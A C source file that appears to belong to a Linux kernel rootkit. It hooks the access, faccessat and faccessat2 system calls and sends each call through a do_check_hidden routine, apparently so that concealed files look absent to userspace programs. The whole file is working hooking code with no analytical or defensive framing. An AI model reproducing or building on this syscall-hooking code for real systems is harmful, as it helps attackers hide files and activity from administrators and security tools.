#include "hooking.h"
#include "macro_utils.h"
#include "syscall_hooks.h"
#include <linux/fcntl.h>
#include <linux/printk.h>
#include <linux/types.h>
#include <linux/uaccess.h>

static inline long do_access(const sysfun_t orig_func, struct pt_regs *const p_regs,
                             const int i32_dfd, const char __user *const s_filename,
                             const int i32_mode, const int i32_at_flags)
{
    IF_U (i32_mode & ~S_IRWXO) {
        return -EINVAL;
    }

    if (i32_at_flags & ~(AT_EACCESS | AT_SYMLINK_NOFOLLOW | AT_EMPTY_PATH)) {
        return -EINVAL;
    }

    return do_check_hidden(orig_func, p_regs, i32_dfd, s_filename, i32_at_flags);
}

// sys_access syscall hook handler
SYSCALL_HOOK_HANDLER2(access, orig_access, p_regs, const char __user *, s_filename, int, i32_mode)
{
    pr_dev_info("access(%p, %s%#o)\n", s_filename, SIGNED_ARG(i32_mode));

    return do_access(orig_access, p_regs, AT_FDCWD, s_filename, i32_mode, 0);
}

// sys_faccessat syscall hook handler
SYSCALL_HOOK_HANDLER3(faccessat, orig_faccessat, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode)
{
    pr_dev_info("faccessat(%d, %p, %s%#o)\n", i32_dfd, s_filename, SIGNED_ARG(i32_mode));

    return do_access(orig_faccessat, p_regs, i32_dfd, s_filename, i32_mode, 0);
}

// sys_faccessat2 syscall hook handler
SYSCALL_HOOK_HANDLER4(faccessat2, orig_faccessat2, p_regs, int, i32_dfd, const char __user *,
                      s_filename, int, i32_mode, int, i32_flags)
{
    pr_dev_info("faccessat2(%d, %p, %s%#o, %s%#x)\n", i32_dfd, s_filename, SIGNED_ARG(i32_mode),
                SIGNED_ARG(i32_flags));

    return do_access(orig_faccessat2, p_regs, i32_dfd, s_filename, i32_mode, i32_flags);
}
